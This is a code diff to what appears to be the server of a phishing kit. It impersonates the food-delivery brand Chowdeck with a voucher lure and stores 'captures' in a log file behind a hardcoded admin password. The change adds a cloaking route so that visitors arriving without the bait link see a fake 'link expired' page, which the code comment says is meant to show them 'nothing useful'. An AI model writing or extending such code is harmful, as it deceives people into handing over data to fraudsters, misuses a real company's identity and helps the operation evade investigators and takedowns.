@@ -13,7 +13,12 @@ const ADMIN_PASS = "password123";
 const sessions   = new Set();
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "public")));
+app.use(express.static(path.join(__dirname, "public"), { index: false }));
+
+// Root — show link expired so direct visitors see nothing useful
+app.get("/", (req, res) => {
+  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Chowdeck</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}.card{background:white;border-radius:14px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}.logo{margin-bottom:20px}.icon{font-size:2.5rem;margin-bottom:12px}.title{font-size:1.1rem;font-weight:700;color:#1B4F2A;margin-bottom:8px}.msg{font-size:0.85rem;color:#777;line-height:1.6;margin-bottom:20px}.btn{display:inline-block;background:#1B4F2A;color:white;padding:12px 28px;border-radius:8px;font-size:0.9rem;font-weight:700;text-decoration:none}footer{margin-top:24px;font-size:0.68rem;color:#aaa}</style></head><body><div class="card"><div class="icon">🔗</div><div class="title">This link has expired</div><div class="msg">The voucher link you followed is no longer active. Voucher links expire after 24 hours or once claimed.<br/><br/>If you received this from someone, ask them to share a fresh link.</div><a class="btn" href="https://chowdeck.com">Go to Chowdeck</a></div><footer>Chowdeck Limited &nbsp;|&nbsp; Lagos, Nigeria</footer></body></html>`);
+});
 
 function loadCaptures() {
   if (fs.existsSync(LOG_FILE)) {
